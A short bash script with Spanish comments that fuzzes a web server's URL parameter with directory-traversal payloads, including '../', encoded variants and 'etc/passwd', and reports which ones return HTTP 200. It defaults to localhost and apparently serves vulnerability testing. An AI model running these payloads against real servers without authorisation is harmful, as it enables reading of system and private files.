#!/bin/bash
# fuzz_url.sh

# Si pasas un argumento, lo usa como URL_BASE. Si no, usa el default de localhost.
# Uso: ./fuzz_url.sh http://mi-servidor:8080/?q=
URL_BASE="${1:-http://localhost:3000/?page=}"

# Lista rápida de payloads
declare -a payloads=(
    "../"
    "../../"
    "%2e%2e%2f"
    "....//"
    "etc/passwd"
    "index.php"
    "private"
)

echo "Atacando servidor en: $URL_BASE"
for payload in "${payloads[@]}"
do
    # --path-as-is evita que curl normalice los ../ antes de enviarlos.
    # Esto es vital para probar ataques de Directory Traversal reales.
    status=$(curl -o /dev/null -s -w "%{http_code}" --path-as-is "${URL_BASE}${payload}")

    if [ "$status" == "200" ]; then
        echo "Alerta: El servidor devolvió 200 OK para el parámetro maldito: $payload"
    else
        echo "OK: Servidor devolvió HTTP $status para el parámetro: $payload"
    fi
done
